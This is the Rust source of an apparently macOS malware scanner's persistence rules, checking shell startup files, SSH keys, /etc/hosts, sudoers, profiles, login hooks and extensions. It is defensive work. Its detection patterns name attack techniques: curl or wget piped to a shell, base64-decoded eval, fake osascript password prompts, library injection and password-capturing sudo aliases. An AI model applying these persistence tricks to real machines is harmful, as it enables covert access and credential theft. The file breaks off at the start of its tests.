//! Rules for footholds beyond launchd and cron: shell startup files, SSH keys,
//! `/etc/hosts`, sudoers, configuration profiles, login hooks, system and
//! kernel extensions, and Background Task Management items.
//!
//! Normal configuration produces nothing (or an Info line); only the patterns
//! malware uses to keep access or steal credentials are raised.

use std::collections::BTreeMap;

use vogter_model::takeover::{
    BackgroundItem, ConfigProfile, HostsEntry, LoginHook, ShellFile, SshKey, SudoersLine,
    SystemExtension,
};
use vogter_model::{Category, Finding, Severity, SignatureKind, Signing, Snapshot};

use crate::exec::pipeline_into_shell;
use crate::suspicious_location;

pub(crate) fn assess(snap: &Snapshot) -> Vec<Finding> {
    let t = &snap.takeover;
    let mut out = Vec::new();
    for f in &t.shell_files {
        out.extend(shell_file(f));
    }
    out.extend(
        t.ssh_keys
            .iter()
            .map(|k| ssh_key(k, snap.health.remote_login)),
    );
    out.extend(hosts(&t.hosts));
    out.extend(t.sudoers.iter().filter_map(sudoers_line));
    out.extend(profiles(&t.profiles));
    out.extend(t.login_hooks.iter().map(login_hook));
    out.extend(t.system_extensions.iter().filter_map(system_extension));
    out.extend(t.kernel_extensions.iter().map(|k| {
        finding(
            Severity::Low,
            "persistence.extension.kernel",
            format!("Kernel extension {} is loaded", k.bundle_id),
            format!(
                "{}{} runs inside the macOS kernel with full access to the Mac. Apple has \
                 replaced kernel extensions with safer system extensions, so few apps still need \
                 one (some virtualisation, disk and audio tools do). Fine if you installed such a \
                 tool; otherwise find which app it belongs to and remove it.",
                k.bundle_id,
                k.version
                    .as_deref()
                    .map(|v| format!(" (version {v})"))
                    .unwrap_or_default()
            ),
            None,
            Some("kexts".into()),
        )
    }));
    out.extend(t.background_items.iter().filter_map(background_item));
    merge_same_key(out)
}

fn finding(
    severity: Severity,
    check: &str,
    title: String,
    detail: String,
    path: Option<String>,
    source: Option<String>,
) -> Finding {
    Finding {
        severity,
        category: Category::Persistence,
        check: check.into(),
        title,
        detail,
        pid: None,
        path,
        signing: None,
        source,
    }
}

/// Findings with the same key (e.g. two NOPASSWD rules for one user) become one,
/// at the higher severity, with both details.
fn merge_same_key(findings: Vec<Finding>) -> Vec<Finding> {
    let mut by_key: BTreeMap<String, Finding> = BTreeMap::new();
    let mut order = Vec::new();
    for f in findings {
        let key = f.key();
        match by_key.get_mut(&key) {
            Some(prev) => {
                prev.severity = prev.severity.max(f.severity);
                if !prev.detail.contains(&f.detail) {
                    prev.detail.push(' ');
                    prev.detail.push_str(&f.detail);
                }
            }
            None => {
                order.push(key.clone());
                by_key.insert(key, f);
            }
        }
    }
    order
        .into_iter()
        .filter_map(|k| by_key.remove(&k))
        .collect()
}

fn clip(s: &str, max: usize) -> String {
    if s.chars().count() <= max {
        s.to_string()
    } else {
        format!("{}…", s.chars().take(max).collect::<String>())
    }
}

// ---------------------------------------------------------------------------
// Shell startup files
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
enum ShellRisk {
    Download,
    Decode,
    Prompt,
    Dyld,
    Location,
    Wrapper,
    Background,
}

impl ShellRisk {
    fn check(self) -> &'static str {
        match self {
            ShellRisk::Download => "persistence.shell.download",
            ShellRisk::Decode => "persistence.shell.encoded",
            ShellRisk::Prompt => "persistence.shell.password_prompt",
            ShellRisk::Dyld => "persistence.shell.dyld_insert",
            ShellRisk::Location => "persistence.shell.suspicious_location",
            ShellRisk::Wrapper => "persistence.shell.wrapper",
            ShellRisk::Background => "persistence.shell.background",
        }
    }

    fn what(self) -> &'static str {
        match self {
            ShellRisk::Download => "downloads and runs code every time a shell starts",
            ShellRisk::Decode => "runs hidden (encoded) code every time a shell starts",
            ShellRisk::Prompt => "shows a password dialog when a shell starts",
            ShellRisk::Dyld => "injects a library into programs (DYLD_INSERT_LIBRARIES)",
            ShellRisk::Location => "runs a program from a temp, Downloads or hidden folder",
            ShellRisk::Wrapper => "replaces a security-sensitive command",
            ShellRisk::Background => "starts something in the background with every shell",
        }
    }

    fn advice(self) -> &'static str {
        match self {
            ShellRisk::Download => {
                "This runs whatever a web server sends back, each time you open a terminal, \
                 without saving or checking it. Installers do this once; a startup file doing it \
                 every time is unusual and a known way for malware to come back. If you didn't \
                 add it, remove the line."
            }
            ShellRisk::Decode => {
                "Encoded code hides what it does. Legitimate setup lines are readable; malware \
                 hides its commands like this. If you didn't add it, remove the line."
            }
            ShellRisk::Prompt => {
                "Real macOS password prompts come from the system, not from a shell startup \
                 file. Info-stealers use dialogs like this to collect your password. Don't type \
                 your password into it; remove the line."
            }
            ShellRisk::Dyld => {
                "DYLD_INSERT_LIBRARIES loads extra code into every program started from your \
                 shell. It's a debugging feature that malware uses to spy on or change other \
                 programs. If you aren't debugging something right now, remove the line."
            }
            ShellRisk::Location => {
                "Temp, Downloads and hidden Library folders are where malware likes to keep \
                 itself; legitimate tools live in places like /usr/local, /opt/homebrew or your \
                 own projects. Fine if it's a tool you put there yourself; otherwise remove the \
                 line."
            }
            ShellRisk::Wrapper => {
                "Changing what `sudo`, `ssh` or `security` mean lets a script see the passwords \
                 you type into them. Small tweaks (like `alias sudo='sudo '` or a terminal's SSH \
                 helper) are common and fine; a wrapper you don't recognise isn't. If you didn't \
                 add it, remove it and change your password."
            }
            ShellRisk::Background => {
                "Something is started in the background each time a shell opens, so it keeps \
                 running after you close the window. Some people start agents this way on \
                 purpose; it's also how a hidden helper can come back. Fine if you recognise it."
            }
        }
    }
}

/// Commands whose meaning a credential-stealing wrapper would change.
const SENSITIVE_COMMANDS: &[&str] = &["sudo", "ssh", "security", "su", "passwd"];

fn shell_file(f: &ShellFile) -> Vec<Finding> {
    let display = if f.system {
        f.path.clone()
    } else {
        format!("~/{}", f.path.rsplit('/').next().unwrap_or(&f.path))
    };
    // (risk, title extra) -> (severity, lines)
    let mut hits: BTreeMap<(ShellRisk, String), (Severity, Vec<String>)> = BTreeMap::new();
    for l in &f.lines {
        for (risk, severity, extra) in shell_line(&l.text) {
            let e = hits.entry((risk, extra)).or_insert((severity, Vec::new()));
            e.0 = e.0.max(severity);
            e.1.push(format!("line {}: `{}`", l.line, clip(&l.text, 160)));
        }
    }
    hits.into_iter()
        .map(|((risk, extra), (severity, lines))| {
            let title = if extra.is_empty() {
                format!("{display} {}", risk.what())
            } else {
                format!("{display} replaces the `{extra}` command")
            };
            let more = if lines.len() > 5 {
                format!(" (and {} more)", lines.len() - 5)
            } else {
                String::new()
            };
            let shown: Vec<&str> = lines.iter().take(5).map(String::as_str).collect();
            finding(
                severity,
                risk.check(),
                title,
                format!("{}: {}{more}. {}", f.path, shown.join("; "), risk.advice()),
                Some(f.path.clone()),
                Some(f.path.clone()),
            )
        })
        .collect()
}

/// What's risky about one (redacted) shell line: `(risk, severity, command name for wrappers)`.
fn shell_line(text: &str) -> Vec<(ShellRisk, Severity, String)> {
    let lower = text.to_lowercase();
    let mut out = Vec::new();
    let mut add = |r, s| out.push((r, s, String::new()));

    let fetch = ["curl ", "wget "];
    let substituted_fetch = ["<(curl", "<(wget", "$(curl", "$(wget", "`curl", "`wget"]
        .iter()
        .any(|p| lower.contains(p));
    let runs_substitution = lower.contains("<(")
        || lower.contains("eval")
        || ["sh -c", "bash -c", "zsh -c"]
            .iter()
            .any(|s| lower.contains(s));
    if pipeline_into_shell(&lower, &fetch) || (substituted_fetch && runs_substitution) {
        add(ShellRisk::Download, Severity::High);
    }
    let decode = ["base64 -d", "base64 --decode"];
    if pipeline_into_shell(&lower, &decode)
        || (lower.contains("base64") && (lower.contains("eval") || lower.contains("<(")))
    {
        add(ShellRisk::Decode, Severity::High);
    }
    if lower.contains("osascript")
        && ["display dialog", "hidden answer", "password"]
            .iter()
            .any(|p| lower.contains(p))
    {
        add(ShellRisk::Prompt, Severity::High);
    }
    if text.contains("DYLD_INSERT_LIBRARIES") && !lower.trim_start().starts_with("unset") {
        add(ShellRisk::Dyld, Severity::High);
    }
    if commands(text).iter().any(|c| runs_from_suspicious(c)) {
        add(ShellRisk::Location, Severity::High);
    }
    if lower
        .split_whitespace()
        .any(|w| w == "nohup" || w == "disown")
        || backgrounds(text)
    {
        add(ShellRisk::Background, Severity::Medium);
    }
    if let Some((name, severity)) = wrapper(text) {
        out.push((ShellRisk::Wrapper, severity, name));
    }
    out
}

/// Split a line into simple commands (words, quotes removed), ending each at
/// `;`, `|`, `&`, parentheses, braces and backticks outside quotes.
fn commands(line: &str) -> Vec<Vec<String>> {
    let mut cmds = Vec::new();
    let mut cur: Vec<String> = Vec::new();
    let mut word = String::new();
    let mut quote: Option<char> = None;
    let flush_word = |word: &mut String, cur: &mut Vec<String>| {
        if !word.is_empty() {
            cur.push(std::mem::take(word));
        }
    };
    let mut chars = line.chars().peekable();
    while let Some(c) = chars.next() {
        match (quote, c) {
            (Some(q), c) if c == q => quote = None,
            (Some(_), c) => word.push(c),
            (None, '\'' | '"') => quote = Some(c),
            (None, '$') if chars.peek() == Some(&'(') => {}
            (None, ';' | '|' | '&' | '(' | ')' | '{' | '}' | '`') => {
                flush_word(&mut word, &mut cur);
                if !cur.is_empty() {
                    cmds.push(std::mem::take(&mut cur));
                }
            }
            (None, c) if c.is_whitespace() => flush_word(&mut word, &mut cur),
            (None, c) => word.push(c),
        }
    }
    flush_word(&mut word, &mut cur);
    if !cur.is_empty() {
        cmds.push(cur);
    }
    cmds
}

/// Words that come before the program a command actually runs.
const PREFIXES: &[&str] = &[
    "if",
    "then",
    "else",
    "elif",
    "do",
    "while",
    "until",
    "!",
    "time",
    "exec",
    "nohup",
    "command",
    "builtin",
    "noglob",
    "nocorrect",
    "sudo",
    "env",
    "source",
    ".",
    "sh",
    "bash",
    "zsh",
    "dash",
    "perl",
    "ruby",
    "node",
    "osascript",
    "open",
    "eval",
];

fn runs_from_suspicious(cmd: &[String]) -> bool {
    // Tests (`[[ -d /tmp/x ]]`) only look at a path.
    if matches!(cmd.first().map(String::as_str), Some("[[" | "[" | "test")) {
        return false;
    }
    let program = cmd.iter().find(|w| {
        let base = w.rsplit('/').next().unwrap_or(w);
        !(PREFIXES.contains(&w.as_str())
            || PREFIXES.contains(&base)
            || base.starts_with("python")
            || w.starts_with('-')
            || is_assignment(w))
    });
    program.is_some_and(|p| suspicious_path(p).is_some())
}

fn is_assignment(w: &str) -> bool {
    w.split_once('=').is_some_and(|(name, _)| {
        !name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
    })
}

/// [`suspicious_location`], also for `$TMPDIR`.
fn suspicious_path(p: &str) -> Option<&'static str> {
    if p.starts_with("$TMPDIR") || p.starts_with("${TMPDIR") {
        return Some("a temp folder");
    }
    suspicious_location(p)
}

/// A lone `&` outside quotes: runs the command before it in the background.
/// Not `&&`, `2>&1`, `&>`, `|&`.
fn backgrounds(line: &str) -> bool {
    let chars: Vec<char> = line.chars().collect();
    let mut quote: Option<char> = None;
    for (i, &c) in chars.iter().enumerate() {
        match (quote, c) {
            (Some(q), c) if c == q => quote = None,
            (Some(_), _) => {}
            (None, '\'' | '"') => quote = Some(c),
            (None, '&') => {
                let prev = i.checked_sub(1).map(|j| chars[j]);
                let next = chars.get(i + 1).copied();
                let joined = |ch: Option<char>| matches!(ch, Some('&' | '>' | '<' | '|'));
                if !joined(prev) && !joined(next) {
                    return true;
                }
            }
            _ => {}
        }
    }
    false
}

/// `alias sudo=…` or a `sudo()` function: which command, and how worrying.
fn wrapper(line: &str) -> Option<(String, Severity)> {
    let t = line.trim();
    if let Some(rest) = t.strip_prefix("alias ") {
        let rest = rest.trim_start_matches("-g ").trim();
        let (name, value) = rest.split_once('=')?;
        let name = name.trim();
        if !SENSITIVE_COMMANDS.contains(&name) {
            return None;
        }
        let value = value.trim().trim_matches(|c| c == '\'' || c == '"');
        return alias_severity(name, value).map(|s| (name.to_string(), s));
    }
    // `sudo() {`, `function sudo {`, `function sudo() {`
    let head = t.strip_prefix("function ").unwrap_or(t);
    let name: String = head
        .chars()
        .take_while(|c| c.is_ascii_alphanumeric() || *c == '_')
        .collect();
    let after = head[name.len()..].trim_start();
    let is_fn = (t.starts_with("function ") && (after.starts_with('{') || after.starts_with("()")))
        || after.starts_with("()");
    (is_fn && SENSITIVE_COMMANDS.contains(&name.as_str())).then_some((name, Severity::Medium))
}

fn alias_severity(name: &str, value: &str) -> Option<Severity> {
    let lower = value.to_lowercase();
    // Reading a password silently, saving or sending what's typed.
    let redirects = ["2>/dev/null", ">/dev/null", "> /dev/null", "2>&1"]
        .iter()
        .fold(lower.clone(), |s, r| s.replace(r, ""))
        .contains('>');
    let captures = redirects
        || [
            "read -s",
            "read -rs",
            "read -sr",
            "tee ",
            "curl",
            "nc ",
            "osascript",
        ]
        .iter()
        .any(|p| lower.contains(p));
    let words = commands(value);
    let first = words
        .first()
        .and_then(|c| {
            c.iter()
                .find(|w| !is_assignment(w) && !PREFIXES.contains(&w.as_str()))
        })
        .cloned()
        .unwrap_or_default();
    let hidden = first
        .split('/')
        .any(|part| part.starts_with('.') && part != "." && part != "..");
    if captures || suspicious_path(&first).is_some() || hidden {
        return Some(Severity::High);
    }
    let base = first.rsplit('/').next().unwrap_or(&first);
    let standard_dir = !first.contains('/')
        || [
            "/usr/bin/",
            "/bin/",
            "/usr/sbin/",
            "/sbin/",
            "/usr/local/bin/",
            "/opt/homebrew/bin/",
        ]
        .iter()
        .any(|d| first.starts_with(d));
    let mentions_itself = words.iter().flatten().any(|w| w == name);
    let chained = words.len() > 1;
    if (base == name && standard_dir && !chained) || (mentions_itself && !chained) {
        // `alias sudo='sudo '`, `alias ssh='kitty +kitten ssh'`, `alias ssh='TERM=xterm ssh'`.
        return None;
    }
    Some(Severity::Medium)
}

// ---------------------------------------------------------------------------
// SSH keys
// ---------------------------------------------------------------------------

fn ssh_key(k: &SshKey, remote_login: Option<bool>) -> Finding {
    let on = remote_login == Some(true);
    let severity = match (k.user == "root", on) {
        (true, true) => Severity::High,
        (true, false) | (false, true) => Severity::Medium,
        (false, false) => Severity::Info,
    };
    let short_type = k.key_type.trim_start_matches("ssh-");
    let fp = k.fingerprint.as_deref().unwrap_or("malformed key");
    let short_fp: String = fp.trim_start_matches("SHA256:").chars().take(8).collect();
    let comment = k.comment.as_deref().unwrap_or("no comment");
    let mut detail = format!(
        "{} line {}: {} key {fp} (\"{comment}\").",
        k.file, k.line, k.key_type
    );
    if let Some(opts) = &k.options {
        let mut notes = Vec::new();
        if let Some(cmd) = option_value(opts, "command") {
            notes.push(format!("it can only run `{}`", clip(&cmd, 80)));
        }
        if let Some(from) = option_value(opts, "from") {
            notes.push(format!("only from {from}"));
        }
        detail.push_str(&format!(" Options: {}", clip(opts, 160)));
        if !notes.is_empty() {
            detail.push_str(&format!(" ({})", notes.join(", ")));
        }
        detail.push('.');
    }
    detail.push_str(&format!(
        " Whoever has the matching private key can log in to this Mac as {} over SSH{}. \
         Fine if it's a key you added yourself, for example from another of your computers. \
         If you don't recognise it, delete that line from the file.",
        k.user,
        if on {
            ", and Remote Login is on, so that works right now"
        } else {
            " once Remote Login is switched on"
        }
    ));
    finding(
        severity,
        "persistence.ssh.authorized_key",
        format!(
            "SSH key can log in as {}: {short_type} \"{}\" ({short_fp})",
            k.user,
            clip(comment, 40)
        ),
        detail,
        Some(k.file.clone()),
        Some(k.file.clone()),
    )
}

/// `name="value"` from an authorized_keys option list.
fn option_value(opts: &str, name: &str) -> Option<String> {
    let start = opts.find(&format!("{name}=\""))? + name.len() + 2;
    let end = opts[start..]
        .find('"')
        .map(|e| start + e)
        .unwrap_or(opts.len());
    Some(opts[start..end].to_string())
}

// ---------------------------------------------------------------------------
// /etc/hosts
// ---------------------------------------------------------------------------

/// Domains (and their subdomains) that should never be redirected elsewhere.
const PROTECTED_DOMAINS: &[&str] = &[
    "apple.com",
    "icloud.com",
    "me.com",
    "cdn-apple.com",
    "apple-cloudkit.com",
    "google.com",
    "googleapis.com",
    "microsoft.com",
    "windowsupdate.com",
    "github.com",
    "githubusercontent.com",
    "objective-see.org",
    "malwarebytes.com",
    "virustotal.com",
    "paypal.com",
];
/// Names whose blocking stops updates or security tools (blocking other
/// subdomains, e.g. ad or telemetry hosts, is common and fine).
const CRITICAL_HOSTS: &[&str] = &[
    "swscan.apple.com",
    "swdist.apple.com",
    "swcdn.apple.com",
    "swdownload.apple.com",
    "mesu.apple.com",
    "gdmf.apple.com",
    "xprotect.apple.com",
    "updates.cdn-apple.com",
    "updates-http.cdn-apple.com",
    "osrecovery.apple.com",
    "oscdn.apple.com",
    "gs.apple.com",
    "ocsp.apple.com",
    "ocsp2.apple.com",
    "api.apple-cloudkit.com",
];
/// Security vendors: blocking any of their hosts is how malware disables them.
const SECURITY_VENDORS: &[&str] = &["objective-see.org", "malwarebytes.com", "virustotal.com"];

fn under(name: &str, domain: &str) -> bool {
    name == domain || name.ends_with(&format!(".{domain}"))
}

fn is_blocking(addr: &str) -> bool {
    addr == "0.0.0.0" || addr.starts_with("127.") || addr == "::" || addr == "::1"
}

fn is_default_host(addr: &str, name: &str) -> bool {
    matches!(
        (addr, name),
        (
            "127.0.0.1" | "::1" | "fe80::1%lo0",
            "localhost" | "localhost.localdomain"
        ) | ("255.255.255.255", "broadcasthost")
    )
}

fn hosts(entries: &[HostsEntry]) -> Vec<Finding> {
    let mut redirects = Vec::new();
    let mut blocks = Vec::new();
    let mut custom = Vec::new();
    let file = entries.first().map(|e| e.file.clone()).unwrap_or_default();
    for e in entries {
        for name in e.names.iter().filter(|n| !is_default_host(&e.address, n)) {
            let protected = PROTECTED_DOMAINS.iter().any(|d| under(name, d));
            let critical = CRITICAL_HOSTS.contains(&name.as_str())
                || PROTECTED_DOMAINS
                    .iter()
                    .any(|d| name == d || *name == format!("www.{d}"))
                || SECURITY_VENDORS.iter().any(|d| under(name, d));
            let pair = format!("{name} → {} (line {})", e.address, e.line);
            if protected && !is_blocking(&e.address) {
                redirects.push(pair);
            } else if critical {
                blocks.push(pair);
            } else {
                custom.push(pair);
            }
        }
    }
    let list = |v: &[String]| {
        let mut s = v.iter().take(8).cloned().collect::<Vec<_>>().join(", ");
        if v.len() > 8 {
            s.push_str(&format!(" and {} more", v.len() - 8));
        }
        s
    };
    let mut out = Vec::new();
    let source = Some(file.clone());
    if !redirects.is_empty() {
        out.push(finding(
            Severity::High,
            "persistence.hosts.redirect",
            "/etc/hosts sends well-known sites to another address".into(),
            format!(
                "{}. Apple, Google, Microsoft, GitHub, banking and security sites should be \
                 reached directly. Redirecting them in /etc/hosts is how malware shows fake \
                 sign-in or update pages. Unless you set this up for testing, remove these lines \
                 (`sudo nano /etc/hosts`).",
                list(&redirects)
            ),
            Some(file.clone()),
            source.clone(),
        ));
    }
    if !blocks.is_empty() {
        out.push(finding(
            Severity::High,
            "persistence.hosts.block",
            "/etc/hosts blocks update or security sites".into(),
            format!(
                "{}. This stops macOS updates, certificate checks or security tools from \
                 reaching their servers, which malware does to protect itself. Some privacy \
                 guides suggest blocking these too, but it leaves the Mac without security \
                 updates. Unless you did this on purpose, remove these lines.",
                list(&blocks)
            ),
            Some(file.clone()),
            source.clone(),
        ));
    }
    if !custom.is_empty() {
        out.push(finding(
            Severity::Low,
            "persistence.hosts.custom",
            "/etc/hosts has custom entries".into(),
            format!(
                "{} entr{}: {}. Developers often add names for local testing, and ad blockers \
                 add many 0.0.0.0 lines. Fine if you recognise them.",
                custom.len(),
                if custom.len() == 1 { "y" } else { "ies" },
                list(&custom)
            ),
            Some(file.clone()),
            source,
        ));
    }
    out
}

// ---------------------------------------------------------------------------
// sudoers
// ---------------------------------------------------------------------------

fn sudoers_line(l: &SudoersLine) -> Option<Finding> {
    let text = l.text.as_str();
    let compact: String = text.split_whitespace().collect();
    let first = text.split_whitespace().next()?;
    let make = |severity, check: &str, title: String, why: &str| {
        Some(finding(
            severity,
            check,
            title,
            format!("{} line {}: `{}`. {why}", l.file, l.line, clip(text, 160)),
            Some(l.file.clone()),
            Some(l.file.clone()),
        ))
    };
    if first == "Defaults" || first.starts_with("Defaults:") || first.starts_with("Defaults>") {
        if compact.contains("!authenticate") {
            return make(
                Severity::High,
                "persistence.sudoers.no_authentication",
                "sudo never asks for a password".into(),
                "With `!authenticate`, anything running as an admin user can become root \
                 without your password. macOS doesn't ship this. Unless you set it up \
                 deliberately, remove the line with `sudo visudo`.",
            );
        }
        if compact.contains("timestamp_timeout=-") {
            return make(
                Severity::Medium,
                "persistence.sudoers.timeout",
                "sudo remembers your password forever".into(),
                "After you use sudo once, anything else running as you can use it too, \
                 indefinitely. Unless you want this, remove the line with `sudo visudo`.",
            );
        }
        return None;
    }
    if first.ends_with("_Alias") {
        return None;
    }
    if matches!(
        compact.as_str(),
        "rootALL=(ALL)ALL"
            | "%adminALL=(ALL)ALL"
            | "rootALL=(ALL:ALL)ALL"
            | "%adminALL=(ALL:ALL)ALL"
    ) {
        return None;
    }
    let who = if let Some(g) = first.strip_prefix('%') {
        format!("group {g}")
    } else {
        first.to_string()
    };
    if let Some(i) = text.find("NOPASSWD:") {
        let cmds = text[i + "NOPASSWD:".len()..].trim();
        if cmds == "ALL" || cmds.starts_with("ALL,") || cmds.starts_with("ALL ") {
            return make(
                Severity::High,
                "persistence.sudoers.nopasswd",
                format!("{who} can do anything as root without a password"),
                "Any program running as this user can take full control of the Mac without \
                 asking. Some setup guides add this for convenience; malware adds it to keep \
                 root access. Unless you added it on purpose, remove the line with `sudo visudo`.",
            );
        }
        return make(
            Severity::Medium,
            "persistence.sudoers.nopasswd",
            format!("{who} can run some commands as root without a password"),
            "Tools like VPN clients or virtual machines sometimes add a rule like this for one \
             helper. Fine if you recognise the commands; otherwise remove the line with \
             `sudo visudo`.",
        );
    }
    let group = first.starts_with('%');
    make(
        if group && matches!(first, "%wheel" | "%sudo") {
            Severity::Low
        } else {
            Severity::Medium
        },
        "persistence.sudoers.rule",
        format!("{who} has extra sudo rights"),
        "On a Mac, admin rights normally come from the admin group, so a separate sudo rule is \
         unusual. Fine if you or your IT department added it; otherwise remove the line with \
         `sudo visudo`.",
    )
}

// ---------------------------------------------------------------------------
// Configuration profiles
// ---------------------------------------------------------------------------

/// Payloads that let a profile read your traffic or control privacy permissions.
const HIGH_PAYLOADS: &[(&str, &str)] = &[
    (
        "com.apple.security.root",
        "installs a trusted root certificate (can read encrypted web traffic)",
    ),
    (
        "com.apple.security.pem",
        "installs a certificate that may be trusted for web traffic",
    ),
    (
        "com.apple.proxy.http.global",
        "sends all web traffic through a proxy",
    ),
    (
        "com.apple.TCC.configuration-profile-policy",
        "grants privacy permissions (screen, files, accessibility) without asking",
    ),
];
const MEDIUM_PAYLOADS: &[(&str, &str)] = &[
    ("com.apple.mdm", "enrols the Mac in remote management (MDM)"),
    ("com.apple.vpn.managed", "sets up a VPN"),
    ("com.apple.vpn.managed.applayer", "sets up a per-app VPN"),
    (
        "com.apple.dnsSettings.managed",
        "changes how names are looked up (DNS)",
    ),
    ("com.apple.webcontent-filter", "filters web traffic"),
    (
        "com.apple.ManagedClient.preferences",
        "sets app and system preferences",
    ),
    (
        "com.apple.servicemanagement",
        "manages login and background items",
    ),
    (
        "com.apple.system-extension-policy",
        "allows system extensions without asking",
    ),
    (
        "com.apple.syspolicy.kernel-extension-policy",
        "allows kernel extensions without asking",
    ),
];

fn profiles(list: &[ConfigProfile]) -> Vec<Finding> {
    let mdm = list
        .iter()
        .find(|p| p.payload_types.iter().any(|t| t == "com.apple.mdm"));
    list.iter()
        .map(|p| {
            let from_mdm = mdm.is_some_and(|m| {
                std::ptr::eq(m, p) || (m.organization.is_some() && m.organization == p.organization)
            });
            let caps: Vec<&str> = HIGH_PAYLOADS
                .iter()
                .chain(MEDIUM_PAYLOADS)
                .filter(|(t, _)| p.payload_types.iter().any(|pt| pt == t))
                .map(|(_, what)| *what)
                .collect();
            let high = HIGH_PAYLOADS
                .iter()
                .any(|(t, _)| p.payload_types.iter().any(|pt| pt == t));
            let severity = if from_mdm {
                Severity::Info
            } else if high {
                Severity::High
            } else {
                Severity::Medium
            };
            let org = p
                .organization
                .as_deref()
                .map(|o| format!(" from {o}"))
                .unwrap_or_default();
            let mut detail = format!(
                "\"{}\" ({}){org}, installed for {}.",
                p.name,
                p.identifier,
                if p.scope == "computer" {
                    "the whole Mac".to_string()
                } else {
                    format!("user {}", p.scope)
                }
            );
            if !caps.is_empty() {
                detail.push_str(&format!(" It {}.", caps.join("; ")));
            }
            if p.removal_disallowed {
                detail.push_str(" It can't be removed by you.");
            }
            detail.push_str(if from_mdm {
                " It comes from the device management your organisation set up, which is normal \
                 for a work or school Mac. Your employer or school can see and change these \
                 settings."
            } else {
                " Profiles can change deep settings, and fake ones are used to read web traffic \
                 or keep control of a Mac. Fine if you installed it yourself (for example for \
                 work, school or a VPN). Otherwise remove it in System Settings → General → \
                 Device Management."
            });
            finding(
                severity,
                "persistence.profile",
                format!("Configuration profile {}", p.name),
                detail,
                None,
                Some(format!("profiles:{}", p.scope)),
            )
        })
        .collect()
}

// ---------------------------------------------------------------------------
// Login hooks
// ---------------------------------------------------------------------------

fn login_hook(h: &LoginHook) -> Finding {
    let program = h.command.split_whitespace().next().unwrap_or(&h.command);
    let apple = h.signing.as_ref().is_some_and(Signing::is_apple)
        && (program.starts_with("/System/") || program.starts_with("/usr/"));
    let when = if h.kind == "LogoutHook" {
        "at every logout"
    } else {
        "at every login"
    };
    let (severity, why) = if !h.exists {
        (
            Severity::Low,
            "The program it points to no longer exists, so it's a leftover. You can remove it with \
             `sudo defaults delete com.apple.loginwindow` followed by the hook name.",
        )
    } else if apple {
        (
            Severity::Low,
            "It runs an Apple program, which is unusual but not harmful by itself.",
        )
    } else {
        (
            Severity::High,
            "Login hooks are an old mechanism Apple deprecated years ago; very few legitimate \
             tools still use one, but malware does because it runs as root. Unless your IT \
             department set it up, remove it with `sudo defaults delete com.apple.loginwindow` \
             followed by the hook name.",
        )
    };
    let signed = h
        .signing
        .as_ref()
        .map(|s| format!(" ({})", s.describe()))
        .unwrap_or_default();
    Finding {
        signing: h.signing.clone(),
        ..finding(
            severity,
            "persistence.hook",
            format!("{} runs {program}", h.kind),
            format!(
                "{} sets {} to `{}`{signed}, which runs as root {when}. {why}",
                h.plist,
                h.kind,
                clip(&h.command, 160)
            ),
            Some(program.to_string()),
            Some(h.plist.clone()),
        )
    }
}

// ---------------------------------------------------------------------------
// System extensions
// ---------------------------------------------------------------------------

fn system_extension(e: &SystemExtension) -> Option<Finding> {
    if !(e.enabled && e.active) && !e.state.contains("activated") {
        return None;
    }
    let what = match e.category.rsplit('.').next().unwrap_or("") {
        "network_extension" => "a network extension (can see or filter network traffic)",
        "endpoint_security" => {
            "an Endpoint Security extension (sees every program start and file access)"
        }
        "driver_extension" => "a driver",
        _ => "a system extension",
    };
    let (severity, who) = match &e.team_id {
        Some(t) => (Severity::Info, format!("signed by developer {t}")),
        None => (
            Severity::Medium,
            "without a developer identity (only possible with developer mode or SIP off)"
                .to_string(),
        ),
    };
    Some(finding(
        severity,
        "persistence.extension.system",
        format!("System extension {}", e.name),
        format!(
            "{} ({}) is {what}, {who}, state: {}. Security tools, VPNs and hardware drivers use \
             these. Fine if you recognise the app; otherwise remove it in System Settings → \
             General → Login Items & Extensions.",
            e.bundle_id,
            e.version.as_deref().unwrap_or("unknown version"),
            e.state
        ),
        None,
        Some("systemextensions".into()),
    ))
}

// ---------------------------------------------------------------------------
// Background Task Management
// ---------------------------------------------------------------------------

fn background_item(b: &BackgroundItem) -> Option<Finding> {
    // Plists in the launchd folders are covered by the launch item checks.
    if !b.enabled || b.kind.starts_with("legacy") {
        return None;
    }
    if !matches!(b.kind.as_str(), "app" | "login item" | "agent" | "daemon") {
        return None;
    }
    if let Some(url) = &b.url
        && ["/Library/LaunchAgents/", "/Library/LaunchDaemons/"]
            .iter()
            .any(|d| url.contains(d) && !url.contains(".app/"))
    {
        return None;
    }
    let path = b.executable.clone().or_else(|| {
        b.url
            .as_deref()
            .and_then(|u| u.strip_prefix("file://"))
            .map(|p| p.trim_end_matches('/').to_string())
    });
    if b.signing.as_ref().is_some_and(Signing::is_apple) {
        return None;
    }
    let location = path.as_deref().and_then(suspicious_location);
    let (severity, why) = match (&b.signing, location) {
        (_, Some(loc)) => (Severity::High, format!("it runs from {loc}")),
        (None, _) => (
            Severity::Low,
            "its program could not be found or checked".to_string(),
        ),
        (Some(s), None) => match s.kind {
            SignatureKind::ThirdParty if s.notarized => (Severity::Info, s.describe()),
            SignatureKind::ThirdParty | SignatureKind::AdHoc => (Severity::Low, s.describe()),
            SignatureKind::Unknown => (Severity::Low, "its signature could not be checked".into()),
            _ => (Severity::Medium, s.describe()),
        },
    };
    let who = b
        .developer
        .as_deref()
        .map(|d| format!(" from {d}"))
        .unwrap_or_default();
    Some(Finding {
        signing: b.signing.clone(),
        ..finding(
            severity,
            "persistence.background_item",
            format!("Background item {}", b.name),
            format!(
                "{} ({}){who} starts automatically: {why}. Apps register these to keep helpers \
                 running; you can review them in System Settings → General → Login Items & \
                 Extensions. Fine if you recognise the app.",
                b.name, b.kind
            ),
            path,
            Some("btm".into()),
        )
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use vogter_model::takeover::{KernelExtension, NumberedLine};

    fn shell(path: &str, lines: &[&str]) -> ShellFile {
        ShellFile {
            path: path.into(),
            system: path.starts_with("/etc/"),
            lines: lines
                .iter()
                .enumerate()
                .map(|(i, t)| NumberedLine {
                    line: i + 1,
                    text: t.to_string(),
                })
                .collect(),
        }
    }

    fn risks(line: &str) -> Vec<(ShellRisk, Severity)> {
        shell_line(line)
            .into_iter()
            .map(|(r, s, _)| (r, s))
            .collect()
    }

    #[test]
    fn ordinary_dotfiles_are_quiet() {
        let benign = [
            r#"eval "$(/opt/homebrew/bin/brew shellenv)""#,
